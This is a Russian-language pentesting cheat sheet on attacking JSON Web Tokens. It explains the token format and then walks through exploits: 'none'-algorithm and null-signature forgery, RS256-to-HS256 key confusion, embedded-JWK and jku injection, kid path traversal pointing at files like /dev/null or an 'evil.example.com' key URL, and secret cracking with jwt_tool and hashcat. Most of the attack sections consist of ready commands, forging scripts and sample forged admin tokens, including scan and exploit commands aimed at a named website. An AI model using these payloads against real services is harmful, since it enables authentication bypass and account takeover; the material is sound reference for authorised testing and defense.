> JSON Web Token (JWT) — это открытый стандарт (RFC 7519), который определяет компактный и автономный способ безопасной передачи информации между сторонами в виде объекта JSON. Эту информацию можно проверить и доверять ей, потому что она имеет цифровую подпись.  

* [Инструменты](#Инструменты)
* [Формат JWT](#Формат-JWT)
    * [Заголовок (Header)](#Заголовок-Header)
    * [Полезная нагрузка (Payload)](#Полезная-нагрузка-Payload)
* [Подпись JWT (JWT Signature)](#Подпись-JWT-JWT-Signature)
    * [JWT - Атака нулевой подписью (CVE-2020-28042)](#JWT---Атака-нулевой-подписью-CVE-2020-28042)
    * [JWT - Раскрытие корректной подписи (CVE-2019-7644)](#JWT-Раскрытие-корректной-подписи-CVE-2019-7644)
    * [JWT - Алгоритм "none" (CVE-2015-9235)](#JWT-Алгоритм-none-CVE-2015-9235)
    * [JWT - Атака смешения ключей RS256 на HS256 (CVE-2016-5431)](#JWT-Атака-смешения-ключей-RS256-на-HS256-CVE-2016-5431)
    * [JWT - Атака внедрения ключа (CVE-2018-0114)](#JWT-Атака-внедрения-ключа-CVE-2018-0114)
    * [JWT - Восстановление открытого ключа из подписанных JWT](#JWT-Восстановление-открытого-ключа-из-подписанных-JWT)
* [JWT Secret](#JWT-Secret)
    * [Кодирование и декодирование JWT с секретом](#Кодирование-и-декодирование-JWT-с-секретом)
    * [Взлом секрета JWT](#Взлом-секрета-JWT)
* [JWT Claims](#JWT-Claims)
    * [Неправильное использование утверждения kid в JWT](#Неправильное-использование-утверждения-kid-в-JWT)
    * [JWKS - внедрение через заголовок jku](#JWKS-внедрение-через-заголовок-jku)

# Инструменты

* [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) - Набор инструментов для тестирования, изменения и взлома JSON Web Tokens
* [brendan-rius/c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) - Взломщик JWT методом перебора, написанный на C
* [PortSwigger/JOSEPH](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61) - Помощник по тестированию на проникновение для JavaScript Object Signing and Encryption
* [jwt.io](https://www.jwt.io/) - Кодировщик/Декодировщик

# Формат JWT

JSON Web Token : ```Base64(Заголовок).Base64(Данные).Base64(Подпись)```

* Пример: ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY```

* 3 компонента, разделенные точкой.
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 # заголовок
eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ # полезная нагрузка
UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # подпись
```
* **Header** — заголовок. Эта часть содержит информацию об алгоритме подписи токена и типе токена — всегда JWT. Заголовок обычно выглядит как JSON.
* **Payload** — полезная нагрузка. Эта часть содержит утверждения (claims) — идентификатор пользователя, срок действия токена и другие пользовательские данные. Полезная нагрузка тоже представлена в формате JSON.
* **Signature** — подпись. Эта часть содержит подпись токена, созданную на основе заголовка и полезной нагрузки, — с использованием секретного ключа, если используется соответствующий алгоритм. Подпись позволяет проверить, был ли токен подделан. Фактически она обеспечивает аутентификацию и целостность токена.

## Заголовок (Header)

Зарегистрированные имена параметров заголовка, определенные в [RFC JSON Web Signature (JWS)](https://www.rfc-editor.org/rfc/rfc7515). Самый простой заголовок JWT представляет собой следующий JSON.
```python
{
"typ": "JWT",
"alg": "HS256"
}
```
* Другие параметры зарегистрированы в RFC.

| Параметр | Определение | Описание |
| :--- | :--- | :--- |
| **alg** | Algorithm (Алгоритм) | Идентифицирует криптографический алгоритм, используемый для защиты JWS |
| **jku** | JWK Set URL (URL набора JWK) | Ссылается на ресурс для набора открытых ключей в формате JSON |
| **jwk** | JSON Web Key (JSON Web Key) | Открытый ключ, используемый для цифровой подписи JWS |
| **kid** | Key ID (Идентификатор ключа) | Ключ, используемый для защиты JWS |
| **x5u** | X.509 URL (X.509 URL) | URL для сертификата открытого ключа X.509 или цепочки сертификатов |
| **x5c** | X.509 Certificate Chain (Цепочка сертификатов X.509) | Сертификат открытого ключа X.509 или цепочка сертификатов в кодировке PEM, используемая для цифровой подписи JWS |
| **x5t** | X.509 Certificate SHA-1 Thumbprint (Отпечаток SHA-1 сертификата X.509) | Отпечаток SHA-1 (дайджест) в кодировке Base64url от DER-кодирования сертификата X.509 |
| **x5t#S256** | X.509 Certificate SHA-256 Thumbprint (Отпечаток SHA-256 сертификата X.509) | Отпечаток SHA-256 (дайджест) в кодировке Base64url от DER-кодирования сертификата X.509 |
| **typ** | Type (Тип) | Media Type. Обычно "JWT" |
| **cty** | Content Type (Тип содержимого) | Этот параметр заголовка не рекомендуется использовать |
| **crit** | Critical (Критический) | Указывает, что используются расширения и/или JWA, которые должны быть обработаны и проверены |

> Алгоритм по умолчанию - "HS256" (симметричное шифрование HMAC SHA256). "RS256" используется для асимметричных целей (асимметричное шифрование RSA и подпись закрытым ключом).

| Значение параметра `alg` | Алгоритм цифровой подписи или MAC | Требования |
| :--- | :--- | :--- |
| **HS256** | HMAC с использованием SHA-256 | Обязателен |
| **HS384** | HMAC с использованием SHA-384 | Опционален |
| **HS512** | HMAC с использованием SHA-512 | Опционален |
| **RS256** | RSASSA-PKCS1-v1_5 с использованием SHA-256 | Рекомендован |
| **RS384** | RSASSA-PKCS1-v1_5 с использованием SHA-384 | Опционален |
| **RS512** | RSASSA-PKCS1-v1_5 с использованием SHA-512 | Опционален |
| **ES256** | ECDSA с использованием P-256 и SHA-256 | Рекомендован |
| **ES384** | ECDSA с использованием P-384 и SHA-384 | Опционален |
| **ES512** | ECDSA с использованием P-521 и SHA-512 | Опционален |
| **PS256** | RSASSA-PSS с использованием SHA-256 и MGF1 с SHA-256 | Опционален |
| **PS384** | RSASSA-PSS с использованием SHA-384 и MGF1 с SHA-384 | Опционален |
| **PS512** | RSASSA-PSS с использованием SHA-512 и MGF1 с SHA-512 | Опционален |
| **none** | Цифровая подпись или MAC не выполняются | Обязателен |

Внедрение заголовков с помощью [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool): ```python3 jwt_tool.py JWT_ТУТ -I -hc header1 -hv testval1 -hc header2 -hv testval2```

## Полезная нагрузка (Payload)
```python
{
"sub":"1234567890",
"name":"Amazing Haxx0r",
"exp":"1466270722",
"admin":true
}
```
* **Утверждения (Claims)** — это предопределенные ключи и их значения:

```
iss: издатель токена (issuer)
exp: метка времени истечения срока действия (отклонять токены с истекшим сроком). Примечание: как определено в спецификации, должно быть в секундах.
iat: время выдачи JWT. Может использоваться для определения возраста JWT.
nbf: "не ранее" (not before) — будущее время, когда токен станет активным.
jti: уникальный идентификатор для JWT. Используется для предотвращения повторного использования или воспроизведения JWT.
sub: субъект токена (используется редко)
aud: аудитория токена (также редко используется)
```
Внедрение утверждений в полезную нагрузку с помощью [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool): python3 jwt_tool.py JWT_ТУТ -I -pc payload1 -pv testval3

# Подпись JWT (JWT Signature)

> PEM — это текстовый формат для представления сертификатов и ключей, используя Base64-кодировку.
> JWK — это формат представления криптографического ключа в виде JSON-объекта согласно стандарту RFC 7517.

```python
{
  "keys": [
    {
      "kty": "RSA",                    // тип ключа (RSA, EC, oct)
      "kid": "my-key-2024",            // идентификатор ключа
      "use": "sig",                    // назначение (sig - подпись, enc - шифрование)
      "alg": "RS256",                  // алгоритм
      "n": "wFAz...AqE",              // модуль RSA (public key)
      "e": "AQAB"                      // публичная экспонента RSA
    }
  ]
}
```
## Подпись JWT - Атака нулевой подписью (CVE-2020-28042)

* Отправь JWT с алгоритмом HS256 без подписи, например: ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.```

* **Эксплуатация:**

```python3 jwt_tool.py JWT_ТУТ -X n```

* **Деконструкция:**

```python
{"alg":"HS256","typ":"JWT"}.
{"sub":"1234567890","name":"John Doe","iat":1516239022}
```

## Подпись JWT - Раскрытие корректной подписи (CVE-2019-7644)

* Отправь JWT с некорректной подписью, конечная точка может ответить ошибкой, раскрывающей корректную.

[jwt-dotnet/jwt: Critical Security Fix Required: You disclose the correct signature with each SignatureVerificationException... #61](https://github.com/jwt-dotnet/jwt/issues/61)
[CVE-2019-7644: Security Vulnerability in Auth0-WCF-Service-JWT](https://auth0.com/docs/secure/security-guidance/security-bulletins/cve-2019-7644)

```
Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=
```

## Подпись JWT - Алгоритм "none" (CVE-2015-9235)

> JWT поддерживает алгоритм None для подписи. Вероятно, это было введено для отладки приложений. 

* Варианты алгоритма none:
```
none
None
NONE
nOnE
```

> Чтобы воспользоваться этой уязвимостью, нужно просто декодировать JWT и изменить алгоритм, используемый для подписи. Затем можно отправить свой новый JWT. Однако это не сработает, если не удалить подпись.

> Альтернативно, можно изменить существующий JWT (будь осторожны со временем истечения срока действия).

* Использование [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

```python
python3 jwt_tool.py [JWT_ТУТ] -X a eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJz....
```

* Ручное редактирование JWT

```python
import jwt

jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
decodedToken = jwt.decode(jwtToken, verify=False)

# декодируем токен перед кодированием с типом 'None'
noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)

print(noneEncoded.decode())
```

## Подпись JWT - Атака смешения ключей RS256 на HS256 (CVE-2016-5431)

> Если код сервера ожидает токен с "alg", установленным в RSA, но получает токен с "alg", установленным в HMAC, он может по ошибке использовать открытый ключ в качестве симметричного ключа HMAC при проверке подписи.

Поскольку пользователь иногда может получить открытый ключ, он может изменить алгоритм в заголовке на HS256, а затем использовать открытый ключ RSA для подписи данных. Когда приложения используют одну и ту же пару ключей RSA для своего TLS-веб-сервера: ```openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout```

> Алгоритм HS256 использует секретный ключ для подписи и проверки каждого сообщения. Алгоритм RS256 использует закрытый ключ для подписи сообщения и открытый ключ для аутентификации.

```python
import jwt
public = open('public.pem', 'r').read()
print public
print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
```
⚠️ Это поведение исправлено в библиотеке Python и будет возвращать ошибку ```jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret..``` Вам нужно установить следующую версию:``` pip install pyjwt==0.4.3```.

* Использование [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

```python3 jwt_tool.py JWT_ТУТ -X k -pk my_public.pem```

* Использование [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)

1. Найди открытый ключ, обычно в:
```
/jwks.json
/.well-known/jwks.json
/auth/jwks
/api/jwks
/keys
/security/jwks
/public-keys
```
2. Загрузи New RSA Key в JWT Editor Keys.
3. В диалоговом окне вставь полученный JWK: ```{"kty":"RSA","e":"AQAB","use":"sig","kid":"961a...85ce","alg":"RS256","n":"16aflvW6...UGLQ"}```
4. Выбери переключатель PEM и скопируйте полученный ключ PEM.
5. Закодируй PEM в Base64.
6. На вкладке JWT Editor Keys сгенерируй New Symmetric Key в формате JWK.
7. Замени сгенерированное значение параметра k на ключ PEM в кодировке Base64, который только что скопировал.
8. Измени алгоритм alg токена JWT на HS256 и данные.
9. Нажми Sign и выберите опцию: Don't modify header

* Ручное редактирование токена RS256 в HS256 с использованием следующих шагов

1. Преобразуй открытый ключ (key.pem) в HEX с помощью:
```python
$ cat key.pem | xxd -p | tr -d "\\n"
2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
```
2. Сгенерируй подпись HMAC, предоставив открытый ключ в виде шестнадцатеричного ASCII и ранее отредактированный токен.
```python
$ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a

(stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0
```
3. Преобразуйте подпись (Hex в "base64 URL").
```python
python2 -c "exec("import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')")"
```
4. Добавьте подпись к отредактированной полезной нагрузке.
```python
[ЗАГОЛОВОК ИЗМЕНЕН С RS256 НА HS256].[ДАННЫЕ ИЗМЕНЕНЫ].[ПОДПИСЬ]
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA
```

## Подпись JWT - Атака внедрения ключа (CVE-2018-0114)
text

Уязвимость в открытой библиотеке Cisco node-jose до версии 0.11.0 может позволить неаутентифицированному удаленному злоумышленнику повторно подписывать токены, используя ключ, встроенный в токен. Уязвимость возникает из-за того, что node-jose следует стандарту JSON Web Signature (JWS) для JSON Web Tokens (JWT). Этот стандарт указывает, что JSON Web Key (JWK), представляющий открытый ключ, может быть встроен в заголовок JWS. Затем этому открытому ключу доверяют для проверки. Злоумышленник может воспользоваться этим, подделывая действительные объекты JWS, удаляя исходную подпись, добавляя новый открытый ключ в заголовок, а затем подписывая объект с использованием (принадлежащего злоумышленнику) закрытого ключа, связанного с открытым ключом, встроенным в этот заголовок JWS.

Эксплуатация:
text

Использование [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

python3 jwt_tool.py [JWT_ТУТ] -X i

Использование portswigger/JWT Editor
    Добавьте New RSA key
    На вкладке Repeater JWT отредактируйте данные
    Attack > Embedded JWK

Деконструкция:

{
"alg": "RS256",
"typ": "JWT",
"jwk": {
"kty": "RSA",
"kid": "jwt_tool",
"use": "sig",
"e": "AQAB",
"n": "uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw"
}
}.
{"login":"admin"}.
[Подписано новым закрытым ключом; открытый ключ внедрен]

## Подпись JWT - Восстановление открытого ключа из подписанных JWT

Алгоритмы RS256, RS384 и RS512 используют RSA с заполнением PKCS#1 v1.5 в качестве схемы подписи. Это свойство позволяет вычислить открытый ключ по двум разным сообщениям и соответствующим подписям.

SecuraBV/jws2pubkey: compute an RSA public key from two signed JWTs

$ docker run -it ttervoort/jws2pubkey JWS1 JWS2
$ docker run -it ttervoort/jws2pubkey "$(cat sample-jws/sample1.txt)" "$(cat sample-jws/sample2.txt)" | tee pubkey.jwk
Computing public key. This may take a minute...
{"kty": "RSA", "n": "sEFRQzskiSOrUYiaWAPUMF66YOxWymrbf6PQqnCdnUla8PwI4KDVJ2XgNGg9XOdc-jRICmpsLVBqW4bag8eIh35PClTwYiHzV5cbyW6W5hXp747DQWan5lIzoXAmfe3Ydw65cXnanjAxz8vqgOZP2ptacwxyUPKqvM4ehyaapqxkBbSmhba6160PEMAr4d1xtRJx6jCYwQRBBvZIRRXlLe9hrohkblSrih8MdvHWYyd40khrPU9B2G_PHZecifKiMcXrv7IDaXH-H_NbS7jT5eoNb9xG8K_j7Hc9mFHI7IED71CNkg9RlxuHwELZ6q-9zzyCCcS426SfvTCjnX0hrQ", "e": "AQAB"}

# JWT Secret
text

Для создания JWT используется секретный ключ для подписи заголовка и полезной нагрузки, что генерирует подпись. Секретный ключ должен храниться в тайне и быть защищенным, чтобы предотвратить несанкционированный доступ к JWT или подделку его содержимого. Если злоумышленник сможет получить доступ к секретному ключу, он сможет создавать, изменять или подписывать свои собственные токены, обходя предусмотренные средства защиты.

Кодирование и декодирование JWT с секретом

Использование ticarpi/jwt_tool:

jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds
jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds -T

Значения заголовка токена:
[+] alg = "HS256"
[+] typ = "JWT"

Значения полезной нагрузки токена:
[+] name = "John Doe"

Использование pyjwt: pip install pyjwt

import jwt
encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')
jwt.decode(encoded, 'secret', algorithms=['HS256'])

Взлом секрета JWT

Полезный список из 3502 общедоступных JWT-секретов: wallarm/jwt-secrets/jwt.secrets.list, включая your_jwt_secret, change_this_super_secret_random_string и т.д.
Инструмент JWT

Сначала перебором находим "секретный" ключ, используемый для вычисления подписи, с помощью ticarpi/jwt_tool.

python3 -m pip install termcolor cprint pycryptodomex requests
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C

Затем редактируем поле внутри JSON Web Token.

Текущее значение role: user
Пожалуйста, введите новое значение и нажмите ENTER

    admin
    [1] sub = 1234567890
    [2] role = admin
    [3] iat = 1516239022
    [0] Continue to next step

Пожалуйста, выберите номер поля (или 0 для продолжения):

    0

Наконец, завершаем токен, подписывая его с помощью ранее полученного "секретного" ключа.

Подпись токена:
[1] Подписать токен известным ключом
[2] Удалить подпись у токена, уязвимого к CVE-2015-2951
[3] Подписать с использованием уязвимости обхода открытого ключа
[4] Подписать токен файлом ключа

Пожалуйста, выберите опцию из вышеперечисленных (1-4):

    1

Пожалуйста, введите известный ключ:

    secret

Пожалуйста, введите длину ключа:
[1] HMAC-SHA256
[2] HMAC-SHA384
[3] HMAC-SHA512

    1

Ваш новый поддельный токен:
[+] Безопасный для URL: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic
[+] Стандартный: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic
text

Разведка: python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw
Сканирование: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb
Эксплуатация: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin
Фаззинг: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -I -hc kid -hv custom_sqli_vectors.txt
Проверка: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin

Hashcat
text

Добавлена поддержка взлома JWT (JSON Web Token) с помощью hashcat со скоростью 365MH/s на одной GTX1080 - src

Атака по словарю: hashcat -a 0 -m 16500 jwt.txt wordlist.txt
Атака на основе правил: hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule
Атака полным перебором: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6

# JWT Claims

Утверждения JSON Web Token от IANA

## Неправильное использование утверждения kid в JWT

Утверждение "kid" (идентификатор ключа) в JSON Web Token (JWT) — это необязательный параметр заголовка, который используется для указания идентификатора криптографического ключа, использованного для подписи или шифрования JWT. Важно отметить, что сам идентификатор ключа не обеспечивает никаких преимуществ безопасности, а скорее позволяет получателю найти ключ, необходимый для проверки целостности JWT.
text

Пример №1 : Локальный файл

{
"alg": "HS256",
"typ": "JWT",
"kid": "/root/res/keys/secret.key"
}

Пример №2 : Удаленный файл

{
"alg":"RS256",
"typ":"JWT",
"kid":"http://localhost:7070/privKey.key"
}

Содержимое файла, указанного в заголовке kid, будет использоваться для генерации подписи.

// Пример для HS256
HMACSHA256(
base64UrlEncode(header) + "." +
base64UrlEncode(payload),
your-256-bit-secret-from-secret.key
)

Распространенные способы неправильного использования заголовка kid:
text

Получение содержимого ключа для изменения полезной нагрузки

Изменение пути к ключу для использования своего собственного

>>> jwt.encode(
...     {"some": "payload"},
...     "secret",
...     algorithm="HS256",
...     headers={"kid": "http://evil.example.com/custom.key"},
... )

Изменение пути к ключу на файл с предсказуемым содержимым.

python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
text

Изменение заголовка kid для попыток SQL-инъекций и инъекций команд.

## JWKS - внедрение через заголовок jku

Значение заголовка "jku" указывает на URL файла JWKS. Заменив URL "jku" на контролируемый злоумышленником URL, содержащий открытый ключ, злоумышленник может использовать соответствующий закрытый ключ для подписи токена и позволить службе получить вредоносный открытый ключ и проверить токен.

Иногда он раскрывается публично через стандартную конечную точку:
text

/jwks.json
/.well-known/jwks.json
/openid/connect/jwks.json
/api/keys
/api/v1/keys
/{tenant}/oauth2/v1/certs

Для этой атаки вы должны создать свою собственную пару ключей и разместить ее. Она должна выглядеть так:

{
"keys": [
{
"kid": "beaefa6f-8a50-42b9-805a-0ab63c3acc54",
"kty": "RSA",
"e": "AQAB",
"n": "nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ"
}
]
}

Эксплуатация:
text

Использование ticarpi/jwt_tool

python3 jwt_tool.py JWT_ТУТ -X s
python3 jwt_tool.py JWT_ТУТ -X s -ju http://example.com/jwks.json

Использование portswigger/JWT Editor
    Сгенерируйте новый ключ RSA и разместите его
    Отредактируйте данные JWT
    Замените заголовок kid на тот, что из вашего JWKS
    Добавьте заголовок jku и подпишите JWT (опция Don't modify header должна быть отмечена)

Деконструкция:

{"typ":"JWT","alg":"RS256", "jku":"https://example.com/jwks.json", "kid":"id_of_jwks"}.
{"login":"admin"}.
[Подписано новым закрытым ключом; открытый ключ экспортирован]

Практические задания (Labs)
